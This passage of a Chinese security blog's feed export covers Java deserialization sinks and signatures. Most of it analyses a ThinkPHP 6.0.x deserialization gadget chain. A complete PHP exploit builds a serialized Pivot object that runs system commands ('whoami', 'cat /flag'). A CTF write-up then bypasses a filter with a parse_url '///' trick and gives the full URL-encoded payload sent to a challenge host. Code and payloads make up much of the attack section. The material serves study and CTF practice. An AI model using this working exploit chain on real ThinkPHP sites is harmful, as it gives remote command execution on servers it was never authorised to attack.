class="hljs-identifier">ObjectInputStream</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>readUnshared<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XMLDecoder</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Yaml</span>.</span></span>load<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XStream</span>.</span></span>fromXML<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectMapper</span>.</span></span>readValue<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parseObject<br></code></pre></td></tr></table></figure><h2 id="数据特征"><a href="#数据特征" class="headerlink" title="数据特征"></a>数据特征</h2><p>序列化的数据头是不变的，传输过程中可能会对字节流进行编码，解码后查看字节流开头，反序列化数据开头包含两字节的魔术数字，后面是两字节的版本号，如<code>ac ed 00 05</code>，而经过Base64编码过序列化数据的字节流头部为<code>Ro0AB</code>，在攻击检测时可针对该特征进行匹配请求post中是否包含反序列化数据，判断是否为反序列化漏洞攻击。</p><h2 id="利用形式"><a href="#利用形式" class="headerlink" title="利用形式"></a>利用形式</h2><p>JDK原生反序列化工具Serializable大致有两种利用形式</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.完整对象前的利用<br>在<span class="hljs-keyword">JDK对恶意序列化数据进行反序列化的过程中达成攻击效果，这种利用方式大多基于对java开发中频繁调用函数的理解，寻找漏洞触发点。例如commons-collections3.1反序列化漏洞利用中的rce </span>gadget属于以readObject函数调用点为入口，直接在依赖包中寻找到rce的利用方式<br><br><span class="hljs-number">2</span>.生成完整对象的利用<br>如身份令牌反序列化，要等待对象反序列化完成后，利用其中的函数或者属性值完成攻击<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp6.0.x反序列化</title>
    <link href="/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>利用链</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">think\Model <span class="hljs-comment">--&gt; __destruct()</span><br>think\Model <span class="hljs-comment">--&gt; save()</span><br>think\Model <span class="hljs-comment">--&gt; updateData()</span><br>think\Model <span class="hljs-comment">--&gt; checkAllowFields()</span><br>think\Model <span class="hljs-comment">--&gt; db()</span><br><br><br>后半部分利用链（同tp <span class="hljs-number">5.2</span>后半部分利用链)<br><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toString()</span><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toJson()</span><br>think\model\concern\<span class="hljs-keyword">Conversion</span> <span class="hljs-comment">--&gt; __toArray()</span><br>think\model\concern\<span class="hljs-keyword">Attribute</span> <span class="hljs-comment">--&gt; getAttr()</span><br>think\model\concern\<span class="hljs-keyword">Attribute</span> <span class="hljs-comment">--&gt; getValue()</span><br></code></pre></td></tr></table></figure><p>vendor/topthink/think-orm/src/Model.php</p><p>Model类中存在<code>__destruct()</code>方法，令<code>$this-&gt;lazySave</code>等于true，调用<code>save()</code>。Model类为抽象类，利用的时候要用它的子类Pivot</p><p><img src="https://ae01.alicdn.com/kf/Udb251c41e330455b8fb5097af7b8f1f4l.jpg"></p><p>跟进<code>save()</code>函数，触发点位于updateData函数内，首先需要构造参数防止函数直接返回，才能进入updateData()函数</p><p><img src="https://ae01.alicdn.com/kf/U7b22f6dd27c7476cb941ac9835abf8c2c.jpg"></p><p>需要满足三个条件才能进入<code>updateData()</code>，</p><p>1.<code>$this-&gt;exists</code>为true</p><p>2.<code>isEmpty()</code>需要返回false，给<code>$this-&gt;data</code>赋值即可</p><p><img src="https://ae01.alicdn.com/kf/Ufc13f37c25054146a92fd6bc978387cfY.jpg"></p><p>3.<code>trigger()</code>需要返回true，让<code>$this-&gt;withEvent</code>等于false</p><p><img src="https://ae01.alicdn.com/kf/U519975bafe3b4ba39b3d4485b2e2558by.jpg"></p><p><code>checkAllowFields()</code>触发<code>__toString()</code>，需要构造参数防止提前return，第一个if条件已经满足。第二个if，需要<code>empty($data)</code>等于false<img src="https://ae01.alicdn.com/kf/U6cfffa14ceb744c9aa721e51c943b08fV.jpg"></p><p>/vendor/topthink/think-orm/src/model/concern/Attribute.php</p><p>跟进getChangeData()方法，让<code>$this-&gt;force</code>和<code>$this-&gt;data</code>都有值就可以</p><p><img src="https://ae01.alicdn.com/kf/U8068fa04022e47df9b42d86110a778a8F.jpg"></p><p>需要先满足<code>$this-&gt;field</code>为空、<code>$this-&gt;schema</code>为空两个条件才能调用<code>$this-&gt;db()</code></p><p><img src="https://ae01.alicdn.com/kf/U2d23332ec7634727b78b56ec0be104b0q.jpg"></p><p><code>db()</code>方法中出现了拼接字符串操作，触发<code>__toString()</code>，需要先让<code>$this-&gt;connection</code>等于mysql</p><p><img src="https://ae01.alicdn.com/kf/U703843abe7084b8291c72699885cb84eC.jpg"></p><p>接下来就是原来tp5的<code>__toString</code>利用链，由于model\concern\Conversion是一个trait复用类，所以只要在Model下use即可</p><p>vendor/topthink/think-orm/src/model/concern/Conversion.php</p><p>存在<code>__toString()</code>方法，调用<code>toJson()</code></p><p><img src="https://ae01.alicdn.com/kf/Ude5942d7801b4bb2a2511f1eca911eb1N.jpg"></p><p>跟进<code>toJson()</code>，调用<code>__toArray()</code></p><p><img src="https://ae01.alicdn.com/kf/U01245cd69e9d40ae8b3d8675f4f51d81N.jpg"></p><p><code>toArray()</code></p><p><img src="https://ae01.alicdn.com/kf/U35601ce018cf4d2bafde20e70dff77a7o.jpg"><img src="https://ae01.alicdn.com/kf/U9c2f1cb03dc24b74bfe0ad667bb02a02H.jpg"></p><p>vendor/topthink/think-orm/src/model/concern/Attribute.php</p><p><code>getAttr()</code>函数，调用getValue()</p><p><img src="https://ae01.alicdn.com/kf/U2fe78f342e7542df97e2b458ea4b8b32s.jpg"></p><p><code>getData()</code></p><p><img src="https://ae01.alicdn.com/kf/Uc4fadcd1d5fe4c539aa5c52b035fb353I.jpg"></p><p><code>getRealFieldName()</code>，<code>$this-&gt;strict</code>等于true返回<code>$name</code>，这样<code>getData()</code>方法就会返回<code>$this-&gt;data[$name]</code>。</p><p><img src="https://ae01.alicdn.com/kf/U75a107b89387416ea707f9c7aa7f978dJ.jpg"></p><p><code>getValue()</code>函数中存在命令执行，当<code>$this-&gt;withAttr[$fieldName]</code>不为数组的时候触发。</p><p><img src="https://ae01.alicdn.com/kf/U2ccdaddc20c3418b9ad6e7aabf3667fc1.jpg"></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span> &#123;<br>    <span class="hljs-title">trait</span> <span class="hljs-title">Conversion</span><br>    &#123;<br>    &#125;<br>    <span class="hljs-title">trait</span> <span class="hljs-title">Attribute</span><br>    &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">data</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [<span class="hljs-string">&quot;xxx&quot;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data = [<span class="hljs-string">&quot;xxx&quot;</span> =&gt; <span class="hljs-string">&quot;whoami&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;<br>        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$force</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$field</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$schema</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;withEvent = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;exists = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;force = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;field = [];<br>            <span class="hljs-keyword">$this</span>-&gt;schema = [];<br>            <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-comment">//定义this-&gt;data不为空</span><br>            <span class="hljs-built_in">parent</span>::__construct();<br>            <span class="hljs-keyword">$this</span>-&gt;get();<br>            <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Pivot();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Pivot(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>本地测试</p><p><img src="https://ae01.alicdn.com/kf/U6147714709d54a8287f0eab71c70632cc.jpg"></p><h1 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h1><p>存在备份文件<a href="http://www.zip/">www.zip</a></p><p><img src="https://ae01.alicdn.com/kf/U9820749315214de0b56df1fdfcfd1972t.jpg"></p><p>查看源码得到版本为thinkphp6，查看控制器，发现存在unserialize。过滤了O开头的字符串，可以根据parse_url的特性绕过，在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false。</p><p><img src="https://ae01.alicdn.com/kf/Ubde65ecd0f4c479f965c9d61ce9abe8fC.jpg"></p><p>在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span> &#123;<br>    <span class="hljs-title">trait</span> <span class="hljs-title">Conversion</span><br>    &#123;<br>    &#125;<br>    <span class="hljs-title">trait</span> <span class="hljs-title">Attribute</span><br>    &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">data</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [<span class="hljs-string">&quot;xxx&quot;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data = [<span class="hljs-string">&quot;xxx&quot;</span> =&gt; <span class="hljs-string">&quot;cat /flag&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;<br>        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$force</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$field</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$schema</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;lazySave = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;withEvent = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;exists = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;force = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;field = [];<br>            <span class="hljs-keyword">$this</span>-&gt;schema = [];<br>            <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-comment">//定义this-&gt;data不为空</span><br>            <span class="hljs-built_in">parent</span>::__construct();<br>            <span class="hljs-keyword">$this</span>-&gt;get();<br>            <span class="hljs-keyword">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Pivot();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Pivot(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>利用反序列化漏洞，得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c<span class="hljs-number">9</span>c<span class="hljs-number">7</span>cb<span class="hljs-number">46</span>-f<span class="hljs-number">78</span>b-<span class="hljs-number">4359</span>-a<span class="hljs-number">3</span>b<span class="hljs-number">6</span>-<span class="hljs-number">7</span>cfc<span class="hljs-number">292</span>d<span class="hljs-number">6693</span>.node<span class="hljs-number">3</span>.buuoj.cn///public/?payload=O%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>lazySave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>withEvent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>exists%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">18</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>force%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>field%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>schema%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>table%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>lazySave%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>withEvent%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>exists%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">18</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>force%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>field%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>schema%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>table%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>withAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">21</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>CModel%<span class="hljs-number">00</span>withAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Ua4b2ba8f1083450a97da5f44101cc09d5.jpg"></p><p>参考</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12203047.html">https://www.cnblogs.com/20175211lyz/p/12203047.html</a></p><p><a href="https://forum.90sec.com/t/topic/1160">https://forum.90sec.com/t/topic/1160</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
